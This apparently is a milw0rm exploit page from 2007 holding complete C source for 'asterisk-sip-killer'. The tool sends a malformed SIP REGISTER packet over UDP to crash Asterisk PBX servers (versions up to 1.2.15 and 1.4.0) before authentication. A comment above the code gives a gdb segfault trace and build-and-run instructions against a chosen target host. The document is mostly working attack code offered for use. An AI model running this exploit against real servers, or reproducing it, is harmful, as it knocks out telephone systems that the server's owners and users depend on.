<html><head><title>Asterisk <= 1.2.15 / 1.4.0 pre-auth Remote Denial of Service Exploit</title></head><pre>/*
this will cause asterisk to segfault,
the bug that this exploits has been patched in release 1.2.16  &amp; 1.4.1

CLI&gt;

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 1082719152 (LWP 2510)]
register_verify (p=0x81cf600, sin=0x4088e750, req=0x4088e760, uri=0x0)
    at chan_sip.c:8257
8257            while (*t &amp;&amp; *t &gt; ' ' &amp;&amp; *t != ';')
(gdb) 


build:
gcc -o asterisk-sip-killer asterisk-sip-killer.c

run:
./asterisk-sip-killer -h &lt;targethost&gt;

*/
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;errno.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/tcp.h&gt;

#define SIP_UDP_PORT 5060

struct udp_session {	
	int sd;
	struct sockaddr_in saddr;
};

int make_udp(struct udp_session *p, char *remotehost, int port)
{
	int sd;
	int ret;
	struct sockaddr_in saddr;
	struct hostent *he;

	sd = socket(AF_INET,SOCK_DGRAM,0);

	if (sd == -1) {
		printf(&quot;error making socket\n&quot;);
		return -1;
	}

	he = gethostbyname(remotehost);
	
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(port);
	saddr.sin_addr.s_addr = inet_addr(remotehost);
	memset(&amp;(saddr.sin_zero), '\0', 8);
	p-&gt;sd = sd;
	memcpy(&amp;p-&gt;saddr,&amp;saddr,sizeof(struct sockaddr_in));

	printf(&quot;udp socket ready\n&quot;);
	
	return 0;
}

void kill_asterisk(struct udp_session *sess)
{
	int ret;
	char *p =
		&quot;REGISTER              \r\n&quot;
		&quot;Via: SIP/2.0/UDP 192.168.204.130:5060;branch=z9hG4bK1d97e14f\r\n&quot;
		&quot;Max-Forwards: 70\r\n&quot;
		&quot;From: &lt;sip:666@192.168.204.130&gt;;tag=as253946cf\r\n&quot;
		&quot;To: &lt;sip:100@192.168.204.130&gt;\r\n&quot;
		&quot;Call-ID: 7e64a49e5cf018231228938050e43d3b@127.0.0.1\r\n&quot;
		&quot;CSeq: 104 REGISTER\r\n&quot;
		&quot;User-Agent: Asterisk PBX\r\n&quot;
		&quot;Expires: 120\r\n&quot;
		&quot;Contact: &lt;sip:666@192.168.204.130&gt;\r\n&quot;
		&quot;Event: registration\r\n&quot;
		&quot;Content-Length: 0\r\n&quot;;

	ret = sendto(sess-&gt;sd, p, strlen(p), 0,
	       (struct sockaddr *)&amp;sess-&gt;saddr,
	       sizeof(struct sockaddr));

	if (ret) {	
		printf(&quot;You may have well shutdown a asterisk server\n&quot;);
	} else {
		printf(&quot;there was a issue sending the request\n&quot;);
		return;
	}
	return;
}
int main(int argc, char **argv)
{
	int i = 0;
	char *r_host = NULL;
	struct udp_session *connection_out;
	

	for (i=0;i&lt;argc;i++) {
		if (!(strcmp(argv[i],&quot;-h&quot;))) {
                        printf(&quot;it looks like you want a host entry\n&quot;);
                        r_host = argv[i+1];
                        printf(&quot;r_host: %s\n&quot;, r_host);
                }
        }

	if (!r_host) {
		printf(&quot;umm you forgot the -h &lt;host&gt; option!\n&quot;);
		return 0;
	}

	if (!(connection_out = (struct udp_session *)malloc(sizeof(struct udp_session)))) {
		printf(&quot;malloc failed your computer sucks\n&quot;);
		return 0;
	}
	make_udp(connection_out, r_host, SIP_UDP_PORT);
	kill_asterisk(connection_out);	
	free(connection_out);
	return 0;
}

// milw0rm.com [2007-03-04]</pre></html>